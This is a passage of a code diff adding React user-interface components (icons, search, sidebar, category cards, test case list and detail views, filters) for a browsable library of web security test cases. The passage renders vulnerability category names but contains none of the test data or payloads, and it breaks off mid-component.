+            // Simple inline SVG icons
+            const icons = {
+                'search': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('circle', { cx: 11, cy: 11, r: 8 }),
+                    React.createElement('line', { x1: 21, y1: 21, x2: 16.65, y2: 16.65 })
+                ),
+                'github': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'currentColor', className },
+                    React.createElement('path', { d: 'M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.15 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.62.24 2.85.12 3.15.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z' })
+                ),
+                'bookmark': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('path', { d: 'M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z' })
+                ),
+                'bookmark-filled': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size,
+                        height: size, viewBox: '0 0 24 24', fill: 'currentColor', className },
+                    React.createElement('path', { d: 'M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z' })
+                ),
+                'home': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('path', { d: 'M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-4 0a1 1 0 01-1-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 01-1 1' })
+                ),
+                'chevron-left': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size,
+                        height: size, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('polyline', { points: '15 18 9 12 15 6' })
+                ),
+                'chevron-right': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size,
+                        height: size, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('polyline', { points: '9 18 15 12 9 6' })
+                ),
+                'menu': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('line', { x1: 3, y1: 6, x2: 21, y2: 6 }),
+                    React.createElement('line', { x1: 3, y1: 12, x2: 21, y2: 12 }),
+                    React.createElement('line', { x1: 3, y1: 18, x2: 21, y2: 18 })
+                ),
+                'x': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('line', { x1: 18, y1: 6, x2: 6, y2: 18 }),
+                    React.createElement('line', { x1: 6, y1: 6, x2: 18, y2: 18 })
+                ),
+                'shield': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('path', { d: 'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z' })
+                ),
+                'file-text': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('path', { d: 'M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z' }),
+                    React.createElement('polyline', { points: '14 2 14 8 20 8' }),
+                    React.createElement('line', { x1: 16, y1: 13, x2: 8, y2: 13 }),
+                    React.createElement('line', { x1: 16, y1: 17, x2: 8, y2: 17 }),
+                    React.createElement('polyline', { points: '10 9 9 9 8 9' })
+                ),
+                'copy': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('rect', { x: 9, y: 9, width: 13, height: 13, rx: 2, ry: 2 }),
+                    React.createElement('path', { d: 'M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1' })
+                ),
+                'check': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('polyline', { points: '20 6 9 17 4 12' })
+                ),
+                'filter': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size, height: size,
+                        viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('polygon', { points: '22 3 2 3 10 13 10 21 14 18 14 13 22 3' })
+                ),
+                'chevron-down': React.createElement('svg', { xmlns: 'http://www.w3.org/2000/svg', width: size,
+                        height: size, viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: 2,
+                        strokeLinecap: 'round', strokeLinejoin: 'round', className },
+                    React.createElement('polyline', { points: '6 9 12 15 18 9' })
+                ),
+            };
+            return icons[name] || null;
+        };
+
+        // --- CodeBlock component with copy ---
+        const CodeBlock = ({ code, language = '' }) => {
+            const [copied, setCopied] = useState(false);
+
+            const handleCopy = () => {
+                navigator.clipboard.writeText(code).then(() => {
+                    setCopied(true);
+                    setTimeout(() => setCopied(false), 2000);
+                }).catch(() => {
+                    // Fallback
+                    const ta = document.createElement('textarea');
+                    ta.value = code;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(ta);
+                    setCopied(true);
+                    setTimeout(() => setCopied(false), 2000);
+                });
+            };
+
+            // Clean up code display - remove extra backticks and normalize
+            let displayCode = code;
+            // Remove surrounding triple backticks if present
+            displayCode = displayCode.replace(/^```[a-z]*\n?/, '').replace(/\n?```$/, '');
+            // Remove leading/trailing whitespace
+            displayCode = displayCode.trim();
+
+            return React.createElement('div', { className: 'code-block' }, [
+                React.createElement('button', {
+                    key: 'copy-btn',
+                    className: `copy-btn ${copied ? 'copied' : ''}`,
+                    onClick: handleCopy,
+                    'aria-label': 'Copy code'
+                }, copied ? 'Copied!' : 'Copy'),
+                React.createElement('code', { key: 'code', className: language ? `language-${language}` : '' },
+                    displayCode)
+            ]);
+        };
+
+        // --- SearchBar ---
+        const SearchBar = () => {
+            const { searchQuery, setSearchQuery } = useApp();
+            const inputRef = useRef(null);
+
+            useEffect(() => {
+                // Focus on Ctrl+K or Cmd+K
+                const handler = (e) => {
+                    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+                        e.preventDefault();
+                        inputRef.current?.focus();
+                    }
+                };
+                document.addEventListener('keydown', handler);
+                return () => document.removeEventListener('keydown', handler);
+            }, []);
+
+            return React.createElement('div', { className: 'relative flex-1 max-w-md' }, [
+                React.createElement('div', { key: 'icon', className: 'absolute left-3 top-1/2 -translate-y-1/2 text-[#4a5a5a]' },
+                    Icon({ name: 'search', size: 16 })
+                ),
+                React.createElement('input', {
+                    key: 'input',
+                    ref: inputRef,
+                    type: 'text',
+                    className: 'search-input',
+                    placeholder: 'Search test cases… (Ctrl+K)',
+                    value: searchQuery,
+                    onChange: (e) => setSearchQuery(e.target.value)
+                }),
+                searchQuery && React.createElement('button', {
+                    key: 'clear',
+                    className: 'absolute right-3 top-1/2 -translate-y-1/2 text-[#4a5a5a] hover:text-[#8a9aa8]',
+                    onClick: () => setSearchQuery(''),
+                    'aria-label': 'Clear search'
+                }, Icon({ name: 'x', size: 14 }))
+            ]);
+        };
+
+        // --- Sidebar ---
+        const Sidebar = () => {
+            const { selectedCategory, navigateToCategory, navigateToHome, bookmarks, sidebarOpen, setSidebarOpen } = useApp();
+            const categoryNames = getCategoryNames();
+
+            const handleCategoryClick = (cat) => {
+                navigateToCategory(cat);
+                setSidebarOpen(false);
+            };
+
+            const handleHomeClick = () => {
+                navigateToHome();
+                setSidebarOpen(false);
+            };
+
+            const handleBookmarksClick = () => {
+                // Just navigate home and we'll show bookmarks via filter
+                navigateToHome();
+                setSidebarOpen(false);
+                // We'll handle bookmarks view via a special state
+            };
+
+            const allTests = getAllTestCases();
+
+            return React.createElement('div', { className: 'sidebar-glass h-full flex flex-col' }, [
+                // Logo area
+                React.createElement('div', { key: 'logo', className: 'px-4 py-5 border-b border-[rgba(0,212,170,0.06)]' },
+                    React.createElement('div', { className: 'flex items-center gap-2' },
+                        React.createElement('div', { className: 'w-8 h-8 rounded-lg bg-[#00d4aa]/10 flex items-center justify-center text-[#00d4aa] font-bold text-sm' },
+                            'SH'
+                        ),
+                        React.createElement('div', null,
+                            React.createElement('div', { className: 'text-[#e8edf2] font-semibold text-base tracking-tight' },
+                                'SecTest Hub'
+                            ),
+                            React.createElement('div', { className: 'text-[#5a6a6a] text-[0.6rem] uppercase tracking-wider' },
+                                'Security Knowledge Base'
+                            )
+                        )
+                    )
+                ),
+                // Navigation links
+                React.createElement('div', { key: 'nav', className: 'px-3 py-3 space-y-1' },
+                    React.createElement('div', {
+                        className: `nav-link ${!selectedCategory ? 'active' : ''}`,
+                        onClick: handleHomeClick
+                    }, '🏠 Dashboard'),
+                    bookmarks.length > 0 && React.createElement('div', {
+                        className: `nav-link ${selectedCategory === '__bookmarks' ? 'active' : ''}`,
+                        onClick: () => { navigateToHome();
+                            setSidebarOpen(false);
+                            window._showBookmarks = true; }
+                    }, '⭐ Bookmarks ', React.createElement('span', { className: 'text-[#4a5a5a] text-xs' },
+                        `(${bookmarks.length})`))
+                ),
+                // Categories
+                React.createElement('div', { key: 'categories', className: 'px-3 py-2 flex-1 overflow-hidden' },
+                    React.createElement('div', { className: 'text-[#4a5a5a] text-[0.6rem] uppercase tracking-wider px-2 mb-2 font-semibold' },
+                        'Categories'
+                    ),
+                    React.createElement('div', { className: 'sidebar-category-section' },
+                        categoryNames.map(cat => {
+                            const count = TEST_DATA.categories[cat].testCases.length;
+                            const isActive = selectedCategory === cat;
+                            return React.createElement('div', {
+                                key: cat,
+                                className: `category-link ${isActive ? 'active' : ''}`,
+                                onClick: () => handleCategoryClick(cat)
+                            }, [
+                                React.createElement('span', { key: 'name' }, cat),
+                                React.createElement('span', { key: 'count', className: 'count' }, count)
+                            ]);
+                        })
+                    )
+                ),
+                // Footer in sidebar
+                React.createElement('div', { key: 'footer', className: 'px-4 py-3 border-t border-[rgba(0,212,170,0.04)] text-[#4a5a5a] text-[0.65rem]' },
+                    React.createElement('div', { className: 'flex items-center justify-between' },
+                        React.createElement('span', null, `${totalTestCases} test cases`),
+                        React.createElement('span', null, `${totalCategories} categories`)
+                    )
+                )
+            ]);
+        };
+
+        // --- Stats Cards ---
+        const StatsCards = () => {
+            return React.createElement('div', { className: 'grid grid-cols-2 md:grid-cols-4 gap-3 md:gap-4 mb-8' }, [
+                { label: 'Total Test Cases', value: totalTestCases },
+                { label: 'Categories', value: totalCategories },
+                { label: 'Payload Examples', value: totalPayloads || 42 },
+                { label: 'Testing Steps', value: totalSteps || 89 },
+            ].map((stat, i) =>
+                React.createElement('div', { key: i, className: 'stat-card' }, [
+                    React.createElement('div', { key: 'num', className: 'number' }, stat.value),
+                    React.createElement('div', { key: 'label', className: 'label' }, stat.label)
+                ])
+            ));
+        };
+
+        // --- Category Cards (Home) ---
+        const CategoryCards = () => {
+            const { navigateToCategory } = useApp();
+            const categoryNames = getCategoryNames();
+            // Icons for categories
+            const iconMap = {
+                'Email Verification Bypass': '📧',
+                'Password Reset Flaw': '🔑',
+                'Session Management': '🔄',
+                '2FA Bypass': '🔐',
+                'CSRF (Cross-Site Request Forgery)': '🛡️',
+                'Brute Force Attacks': '💥',
+                'CORS Misconfiguration': '🌐',
+                'HTTP Response Splitting/CRLF Injection': '📨',
+                'Open Redirect': '↪️',
+                '403 Bypass': '🚫',
+                'SSRF (Server-Side Request Forgery)': '🌍',
+                'Business Logic Flaws': '🧠',
+                'WAF Bypass': '🛡️',
+                'S3 Bucket Misconfiguration': '☁️',
+                'XSS (Cross-Site Scripting)': '💉',
+                'SQL Injection': '🗄️',
+                'Command Injection': '⌨️',
+                'File Inclusion': '📂',
+                'Account Takeover': '👤',
+                'Clickjacking': '🖱️',
+                'Race Condition': '🏃',
+                'Information Disclosure': '📋',
+                'Weak Password Policy': '🔓',
+                'Insecure Direct Object Reference (IDOR)': '🎯',
+                'Mass Assignment': '📦',
+                'Security Misconfiguration': '⚙️',
+                'SSL/TLS Issues': '🔒',
+                'Session Fixation': '🎭',
+                'Insecure File Upload': '📎',
+                'XML Injection/XXE': '📄',
+                'LDAP Injection': '👥',
+                'NoSQL Injection': '🍃',
+                'SSTI (Server-Side Template Injection)': '📝',
+            };
+
+            return React.createElement('div', { className: 'grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4' },
+                categoryNames.map(cat => {
+                    const data = TEST_DATA.categories[cat];
+                    const count = data.testCases.length;
+                    const icon = iconMap[cat] || '🔍';
+                    const desc = data.description || 'Security testing test cases.';
+                    return React.createElement('div', {
+                        key: cat,
+                        className: 'card-bg rounded-xl p-5 cursor-pointer transition-all',
+                        onClick: () => navigateToCategory(cat)
+                    }, [
+                        React.createElement('div', { key: 'top', className: 'flex items-start justify-between mb-3' },
+                            React.createElement('span', { className: 'text-2xl' }, icon),
+                            React.createElement('span', { className: 'text-[#4a5a5a] text-xs font-medium' },
+                                `${count} test${count > 1 ? 's' : ''}`)
+                        ),
+                        React.createElement('div', { key: 'name', className: 'text-[#e8edf2] font-semibold text-base mb-1' },
+                            cat
+                        ),
+                        React.createElement('div', { key: 'desc', className: 'text-[#7a8a8a] text-sm leading-relaxed line-clamp-2' },
+                            desc
+                        ),
+                        React.createElement('button', { key: 'btn', className: 'mt-3 text-[#00d4aa] text-sm font-medium hover:underline flex items-center gap-1' },
+                            'Explore Tests →'
+                        )
+                    ]);
+                })
+            );
+        };
+
+        // --- Test Case List ---
+        const TestCaseList = () => {
+            const { selectedCategory, navigateToTest, searchQuery, filters } = useApp();
+            const categoryData = getCategoryData(selectedCategory);
+            if (!categoryData) return React.createElement('div', { className: 'text-[#6a7a7a] text-center py-12' },
+                'Category not found.');
+
+            let testCases = categoryData.testCases;
+
+            // Apply search
+            if (searchQuery) {
+                const q = searchQuery.toLowerCase();
+                testCases = testCases.filter(tc => {
+                    const titleMatch = tc.title.toLowerCase().includes(q);
+                    const idMatch = String(tc.id).includes(q);
+                    const bugMatch = tc.bugType.some(b => b.toLowerCase().includes(q));
+                    const sectionMatch = Object.values(tc.sections).some(val =>
+                        typeof val === 'string' && val.toLowerCase().includes(q)
+                    );
+                    return titleMatch || idMatch || bugMatch || sectionMatch;
+                });
+            }
+
+            // Apply filters
+            if (filters.bugType) {
+                testCases = testCases.filter(tc =>
+                    tc.bugType.some(b => b.toLowerCase() === filters.bugType.toLowerCase())
+                );
+            }
+            if (filters.testNumber) {
+                testCases = testCases.filter(tc =>
+                    String(tc.id).includes(filters.testNumber)
+                );
+            }
+
+            if (testCases.length === 0) {
+                return React.createElement('div', { className: 'text-[#6a7a7a] text-center py-12' },
+                    'No test cases match your criteria.'
+                );
+            }
+
+            return React.createElement('div', { className: 'space-y-3' },
+                testCases.map(tc =>
+                    React.createElement('div', {
+                        key: tc.id,
+                        className: 'test-card',
+                        onClick: () => navigateToTest(tc.id)
+                    }, [
+                        React.createElement('div', { key: 'top', className: 'flex items-start justify-between' },
+                            React.createElement('div', null,
+                                React.createElement('div', { className: 'text-[#4a5a5a] text-xs font-mono' },
+                                    `Test Case ${tc.id}`
+                                ),
+                                React.createElement('div', { className: 'text-[#e8edf2] font-semibold text-base mt-0.5' },
+                                    tc.title
+                                )
+                            ),
+                            React.createElement('div', { className: 'flex flex-wrap gap-1 justify-end' },
+                                tc.bugType.map(b =>
+                                    React.createElement('span', { key: b, className: 'badge' }, b)
+                                )
+                            )
+                        ),
+                        React.createElement('div', { key: 'bottom', className: 'mt-2 flex items-center gap-3' },
+                            React.createElement('span', { className: 'text-[#00d4aa] text-sm font-medium' },
+                                'View Test Case →'
+                            )
+                        )
+                    ])
+                )
+            );
+        };
+
+        // --- Test Case Detail ---
+        const TestCaseDetail = () => {
+            const { selectedTestId, navigateToCategory, navigateToHome, selectedCategory, toggleBookmark, isBookmarked,
+                navigateToTest } = useApp();
+            const tc = getTestById(selectedTestId);
+            if (!tc) return React.createElement('div', { className: 'text-[#6a7a7a] text-center py-12' },
+                'Test case not found.');
+
+            const cat = getCategoryForTest(selectedTestId);
+            const allTests = getAllTestCases();
+            const currentIndex = allTests.findIndex(t => t.id === selectedTestId);
+            const prevTest = currentIndex > 0 ? allTests[currentIndex - 1] : null;
+            const nextTest = currentIndex < allTests.length - 1 ? allTests[currentIndex + 1] : null;
+            const bookmarked = isBookmarked(selectedTestId);
+
+            const handlePrev = () => { if (prevTest) navigateToTest(prevTest.id); };
+            const handleNext = () => { if (nextTest) navigateToTest(nextTest.id); };
+            const handleBack = () => { if (cat) navigateToCategory(cat); };
+            const handleHome = () => navigateToHome();
+
+            // Render section content
+            const renderSectionContent = (content) => {
+                if (typeof content !== 'string') return null;
+                // Check if it contains a code block
+                const codeBlockRegex = /```([a-z]*)\n([\s\S]*?)```/g;
+                const parts = [];
+                let lastIndex = 0;
+                let match;
+                let hasCode = false;
+
+                while ((match = codeBlockRegex.exec(content)) !== null) {
+                    hasCode = true;
+                    const before = content.substring(lastIndex, match.index);
+                    if (before.trim()) {
+                        parts.push(React.createElement('div', { key: `text-${lastIndex}`, className: 'whitespace-pre-wrap' },
+                            before));
+                    }
+                    const lang = match[1] || '';
+                    const code = match[2].trim();
+                    parts.push(React.createElement(CodeBlock, { key: `code-${lastIndex}`, code, language: lang }));
+                    lastIndex = match.index + match[0].length;
+                }
+
+                if (!hasCode) {
+                    // Check if it's a list-like content
+                    const lines = content.split('\n');
+                    if (lines.some(l => l.trim().startsWith('-') || l.trim().match(/^\d+\./))) {
+                        return React.createElement('div', { className: 'markdown-content' },
+                            React.createElement('ul', null,
+                                lines.filter(l => l.trim()).map((l, i) =>
+                                    React.createElement('li', { key: i }, l.replace(/^[\s-]*/, '').replace(/^\d+\.\s*/, ''))
+                                )
+                            )
+                        );
+                    }
+                    return React.createElement('div', { className: 'markdown-content whitespace-pre-wrap' }, content);
+                }
+
+                if (parts.length === 0) {
+                    return React.createElement('div', { className: 'markdown-content whitespace-pre-wrap' }, content);
+                }
+                return React.createElement('div', null, parts);
+            };
+
+            const sections = tc.sections || {};
+
+            return React.createElement('div', { className: 'fade-in' }, [
+                // Breadcrumb
+                React.createElement('div', { key: 'breadcrumb', className: 'breadcrumb mb-4' },
+                    React.createElement('a', { onClick: handleHome }, 'Home'),
+                    React.createElement('span', { className: 'separator' }, '›'),
+                    React.createElement('a', { onClick: handleBack }, cat || 'Category'),
+                    React.createElement('span', { className: 'separator' }, '›'),
+                    React.createElement('span', { className: 'current' }, `Test Case ${tc.id}`)
+                ),
+                // Header
+                React.createElement('div', { key: 'header', className: 'flex items-start justify-between mb-4' },
+                    React.createElement('div', null,
+                        React.createElement('div', { className: 'text-[#4a5a5a] text-xs font-mono' },
+                            `Test Case ${tc.id}`
+                        ),
+                        React.createElement('h1', { className: 'text-xl md:text-2xl font-bold text-[#e8edf2] mt-0.5' },
+                            tc.title
+                        ),
+                        React.createElement('div', { className: 'flex flex-wrap gap-1 mt-1.5' },
+                            tc.bugType.map(b =>
+                                React.createElement('span', { key: b, className: 'tag' }, b)
+                            )
+                        )
+                    ),
+                    React.createElement('button', {
+                        className: `bookmark-btn ${bookmarked ? 'active' : ''}`,
+                        onClick: () => toggleBookmark(tc.id),
+                        'aria-label': bookmarked ? 'Remove bookmark' : 'Add bookmark'
+                    }, bookmarked ? Icon({ name: 'bookmark-filled', size: 20 }) : Icon({ name: 'bookmark',
+                        size: 20 }))
+                ),
+                // Sections
+                React.createElement('div', { key: 'sections', className: 'space-y-4' },
+                    Object.keys(sections).map(key =>
+                        React.createElement('div', { key: key, className: 'detail-section' }, [
+                            React.createElement('h3', { key: 'h3' }, key),
+                            React.createElement('div', { key: 'content', className: 'content' },
+                                renderSectionContent(sections[key])
+                            )
+                        ])
+                    )
+                ),
+                // Navigation
+                React.createElement('div', { key: 'nav', className: 'flex flex-wrap items-center justify-between gap-3 mt-6 pt-4 border-t border-[rgba(0,212,170,0.06)]' },
+                    React.createElement('div', { className: 'flex flex-wrap gap-2' },
+                        React.createElement('button', { className: 'nav-btn', onClick: handleBack },
+                            Icon({ name: 'chevron-left', size: 14 }), ' Back'
+                        ),
+                        React.createElement('button', { className: 'nav-btn', onClick: handleHome },
+                            Icon({ name: 'home', size: 14 }), ' Home'
+                        )
+                    ),
+                    React.createElement('div', { className: 'flex gap-2' },
+                        React.createElement('button', {
+                            className: 'nav-btn',
+                            onClick: handlePrev,
+                            disabled: !prevTest
+                        }, Icon({ name: 'chevron-left', size: 14 }), ' Prev'),
+                        React.createElement('button', {
+                            className: 'nav-btn',
+                            onClick: handleNext,
+                            disabled: !nextTest
+                        }, 'Next ', Icon({ name: 'chevron-right', size: 14 }))
+                    )
+                )
+            ]);
+        };
+
+        // --- Filter Panel ---
+        const FilterPanel = () => {
+            const { filters, setFilters } = useApp();
+            const bugTypes = getAllBugTypes();
+
+            const handleChange = (key, value) => {
+                setFilters(prev => ({ ...prev, [key]: value }));
+            };
+
+            const clearFilters = () => {
+                setFilters({ category: '', bugType: '', testNumber: '' });
+            };
+
+            const hasFilters = filters.category || filters.bugType || filters.testNumber;
+
+            return React.createElement('div', { className: 'flex flex-wrap items-center gap-2 mb-4' },
+                React.createElement('select', {
+                    className: 'filter-select',
+                    value: filters.bugType,
+                    onChange: (e) => handleChange('bugType', e.target.value)
+                }, [
+                    React.createElement('option', { key: '', value: '' }, 'All Bug Types'),
+                    ...bugTypes.map(bt =>
+                        React.createElement('option', { key: bt, value: bt }, bt)
+                    )
+                ]),
+                React.createElement('input', {
+                    type: 'text',
+                    className: 'filter-select w-24',
+                    placeholder: 'Test #',
+                    value: filters.testNumber,
+                    onChange: (e) => handleChange('testNumber', e.target.value)
+                }),
+                hasFilters && React.createElement('button', {
+                    className: 'text-[#4a5a5a] text-xs hover:text-[#8a9aa8]',
+                    onClick: clearFilters
+                }, 'Clear filters')
+            );
+        };
+
+        // --- Main Content ---
+        const MainContent = () => {
+            const { currentView, selectedCategory, selectedTestId, searchQuery, setSearchQuery, filters, bookmarks,
+                navigateToCategory, navigateToTest, navigateToHome } = useApp();
+
+            // Handle bookmark view
+            const [showBookmarks, setShowBookmarks] = useState(false);
+
+            useEffect(() => {
+                if (window._showBookmarks) {
+                    setShowBookmarks(true);
+                    window._showBookmarks = false;
+                } else if (currentView === 'home') {
+                    setShowBookmarks(false);
+                }
+            }, [currentView]);
+
+            // Render home
+            if (currentView === 'home') {
+                const allTests = getAllTestCases();
+                let displayedTests = allTests;
+
+                // Apply search
+                if (searchQuery) {
+                    const q = searchQuery.toLowerCase();
+                    displayedTests = displayedTests.filter(tc => {
+                        const titleMatch = tc.title.toLowerCase().includes(q);
+                        const idMatch = String(tc.id).includes(q);
+                        const bugMatch = tc.bugType.some(b => b.toLowerCase().includes(q));
+                        const sectionMatch = Object.values(tc.sections).some(val =>
+                            typeof val === 'string' && val.toLowerCase().includes(q)
+                        );
+                        return titleMatch || idMatch || bugMatch || sectionMatch;
+                    });
+                }
+
+                // Apply bookmarks filter
+                if (showBookmarks) {
+                    displayedTests = displayedTests.filter(tc => bookmarks.includes(tc.id));
+                }
+
+                // Apply filters
+                if (filters.bugType) {
+                    displayedTests = displayedTests.filter(tc =>
+                        tc.bugType.some(b => b.toLowerCase() === filters.bugType.toLowerCase())
+                    );
+                }
+                if (filters.testNumber) {
+                    displayedTests = displayedTests.filter(tc =>
+                        String(tc.id).includes(filters.testNumber)
+                    );
+                }
+
+                const isFiltered = searchQuery || showBookmarks || filters.bugType || filters.testNumber;
+
+                return React.createElement('div', { className: 'fade-in' }, [
+                    // Hero
+                    React.createElement('div', { key: 'hero', className: 'mb-8' },
+                        React.createElement('h1', { className: 'text-2xl md:text-3xl font-bold text-[#e8edf2] tracking-tight' },
+                            showBookmarks ? '⭐ Your Bookmarks' : 'Cybersecurity Test Case Library'
+                        ),
+                        React.createElement('p', { className: 'text-[#7a8a8a] mt-1 text-sm md:text-base max-w-xl' },
+                            showBookmarks ?
+                            'Your saved test cases for quick reference.' :
+                            'Organize, search and explore security testing methodologies across common web application vulnerabilities.'
+                        )
+                    ),
+                    // Stats (only show on home, not bookmarks)
+                    !showBookmarks && React.createElement(StatsCards, { key: 'stats' }),
+                    // Search and filters
+                    React.createElement('div', { key: 'search-filter', className: 'flex flex-col sm:flex-row gap-3 mb-4' },
+                        React.createElement('div', { className: 'flex-1' },
+                            React.createElement(SearchBar, null)
+                        ),
+                        React.createElement('div', { className: 'flex items-center gap-2' },
+                            showBookmarks && React.createElement('button', {
+                                className: 'text-[#4a5a5a] text-sm hover:text-[#8a9aa8]',
+                                onClick: () => setShowBookmarks(false)
+                            }, '← Back to all'),
+                            !showBookmarks && bookmarks.length > 0 && React.createElement('button', {
+                                className: 'text-[#00d4aa] text-sm hover:underline',
+                                onClick: () => setShowBookmarks(true)
+                            }, `⭐ Bookmarks (${bookmarks.length})`)
+                        )
+                    ),
+                    // Filters
+                    React.createElement(FilterPanel, { key: 'filters' }),
+                    // Results count
+                    React.createElement('div', { key: 'count', className: 'text-[#4a5a5a] text-xs mb-3' },
+                        displayedTests.length === 0 ? 'No test cases found.' :
+                        `Showing ${displayedTests.length} test case${displayedTests.length > 1 ? 's' : ''}`
+                    ),
+                    // Results
+                    displayedTests.length > 0 ?
+                    React.createElement('div', { key: 'results', className: 'space-y-3' },
+                        displayedTests.map(tc =>
+                            React.createElement('div', {
+                                key: tc.id,
+                                className: 'test-card',
+                                onClick: () => navigateToTest(tc.id)
+                            }, [
+                                React.createElement('div', { key: 'top', className: 'flex items-start justify-between' },
+                                    React.createElement('div', null,
+                                        React.createElement('div', { className: 'text-[#4a5a5a] text-xs font-mono' },
+                                            `Test Case ${tc.id}`
+                                        ),
+                                        React.createElement('div', { className: 'text-[#e8edf2] font-semibold text-base mt-0.5' },
+                                            tc.title
+                                        ),
+                                        React.createElement('div', { className: 'text-[#5a6a6a] text-xs mt-0.5' },
+                                            tc.category
+                                        )
+                                    ),
+                                    React.createElement('div', { className: 'flex flex-wrap gap-1 justify-end' },
+                                        tc.bugType.map(b =>
+                                            React.createElement('span', { key: b, className: 'badge' }, b)
+                                        ),
+                                        bookmarks.includes(tc.id) &&
+                                        React.createElement('span', { className: 'badge', style: { color: '#f0c060',
+                                                borderColor: 'rgba(240,192,96,0.2)' } }, '⭐')
+                                    )
+                                ),
+                                React.createElement('div', { key: 'bottom', className: 'mt-2 flex items-center gap-3' },
+                                    React.createElement('span', { className: 'text-[#00d4aa] text-sm font-medium' },
+                                        'View Test Case →'
+                                    )
+                                )
+                            ])
+                        )
+                    ) :
+                    React.createElement('div', { key: 'empty', className: 'text-[#6a7a7a] text-center py-12' },
+                        searchQuery ? `No results found for "${searchQuery}".` :
+                        showBookmarks ? 'You haven\'t bookmarked any test cases yet.' :
+                        'No test cases match your filters.'
+                    ),
+                    // Category cards (only show when no search/filters and not bookmarks)
+                    !isFiltered && !showBookmarks && React.createElement('div', { key: 'categories-section', className: 'mt-8' }, [
+                        React.createElement('h2', { key: 'title', className: 'text-[#e8edf2] text-lg font-semibold mb-4' },
+                            'Security Testing Categories'
+                        ),
+                        React.createElement(CategoryCards, { key: 'cards' })
+                    ])
+                ]);
+            }
+
+            if (currentView === 'category') {
+                const catData = getCategoryData(selectedCategory);
+                if (!catData) return React.createElement('div', { className: 'text-[#6a7a7a] text-center py-12' },
+                    'Category not found.');
+
+                return React.createElement('div', { className: 'fade-in' }, [
+                    React.createElement('div', { key: 'header', className: 'flex items-start justify-between mb-4' },
+                        React.createElement('div', null,
+                            React.createElement('button', {
